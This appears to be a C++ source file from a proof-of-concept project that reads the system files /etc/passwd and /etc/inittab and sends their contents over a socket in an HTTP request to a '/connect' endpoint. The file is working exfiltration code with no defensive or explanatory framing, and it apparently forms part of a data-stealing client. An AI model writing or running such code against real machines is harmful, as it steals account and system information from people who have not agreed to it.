/*
** POC PROJECT, 2022
** send files
** File description:
** send files to server
*/

#include "http_res.hpp"
#include "http_res.hpp"
#include "manage_messages.hpp"
#include <fstream>
#include <array>

std::string get_files()
{
    std::array<std::string, 2> files_names = {"/etc/passwd", "/etc/inittab"};
    std::string files_content;

    for (auto & file_name : files_names) {
        files_content += get_file(file_name) + "\x03";
    }
    return files_content;
}

void send_file(int socket)
{
    HttpReq req = HttpReq(HttpReq::HttpMethod::GET, "0.0.0.0", "/connect", "HTTP/1.1");

    req << get_files();
    req.send_message(socket);
    HttpRes res = convert_res(socket);
    if (res.get_status_code() != 200) {
        std::cerr << "Error: " << res.get_status_code() << std::endl;
        exit(84);
    }
}
